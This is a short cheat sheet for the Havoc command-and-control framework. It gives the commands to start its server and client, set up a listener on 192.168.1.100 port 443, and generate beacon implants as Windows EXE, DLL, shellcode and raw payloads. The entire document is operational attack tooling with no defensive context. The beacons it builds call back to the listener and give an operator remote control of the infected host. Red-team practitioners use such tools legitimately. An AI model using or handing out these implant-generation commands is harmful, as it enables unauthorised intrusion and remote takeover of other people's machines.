% cat/C2
# Havoc C2
## Basic Usage
### Start Havoc Server
```
sudo ./havoc server
```
### Start Havoc Client
```
./havoc client
```
## Payloads
### Generate Listener
```
havoc listener --name my_listener --host 192.168.1.100 --port 443
```
### Generate Payload (Windows EXE)
```
havoc payload --listener my_listener --format exe --output beacon.exe
```
### Generate Payload (Windows DLL)
```
havoc payload --listener my_listener --format dll --output beacon.dll
```
### Generate Payload (Shellcode)
```
havoc payload --listener my_listener --format shellcode --output beacon.bin
```
### Generate Payload (Raw)
```
havoc payload --listener my_listener --format raw --output beacon.raw
```
